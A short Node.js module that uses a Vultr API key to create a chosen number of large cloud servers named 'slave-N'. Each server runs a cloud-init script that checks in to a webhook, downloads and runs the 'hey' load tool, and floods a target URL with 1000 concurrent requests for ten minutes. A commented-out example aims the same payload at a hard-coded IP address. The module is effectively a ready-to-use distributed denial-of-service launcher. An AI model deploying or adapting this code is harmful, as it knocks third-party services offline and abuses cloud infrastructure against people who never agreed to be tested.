// require axios
//
import axios from "axios"
import { createRequire } from "module";
const require = createRequire(import.meta.url);
let config = require("./config.json")
// for loop 10 Times

async function create_vultr(url, amount) {
	let cloudinit = `
#!/usr/bin/env bash

curl -X POST https://webhook-test.com/602de89d177b999950efe7ec721b045f -H 'Content-Type: application/json' -d '{"username":"xyz","password":"xyz"}'
wget -O hey https://hey-release.s3.us-east-2.amazonaws.com/hey_linux_amd64 ; chmod +x hey && ./hey -z 10m -m GET -c 1000 ${url}
`

	// base64 encode the cloudinit

	cloudinit = Buffer.from(cloudinit).toString("base64")

	for (let i = 1; i <= amount; i++) {
		const response = await axios.post(
			"https://api.vultr.com/v2/instances",
			// '{\n  "size": "s-2vcpu-2gb-amd",\n  "ssh_keys": "39592018",\n  "name": "slave-13",\n  "image": "140878882",\n  "user_data": "#!/bin/bash\\ncurl -X POST https://webhook-test.com/4c097f09b170a675810b879c695002cc -H \'Content-Type: application/json\' -d \'{\\"username\\":\\"xyz\\",\\"password\\":\\"xyz\\"}\'\\nwget -O hey https://hey-release.s3.us-east-2.amazonaws.com/hey_linux_amd64 ; chmod +x hey && ./hey -z 3m -m GET http://88.198.48.45"\n}',
			{
				// new york region
				region: "ams",
				plan: "vhf-8c-32gb",
				name: `slave-${i}`,
				os_id: "387",
				user_data: cloudinit,
			},
			{
				headers: {
					Authorization:
						"Bearer " + config.vultr_key,
					"Content-Type": "application/json; charset=utf-8",
				},
			}
		)
		console.log("Spawned Server: Slave-VULTR-", i)
	}
}

export default create_vultr
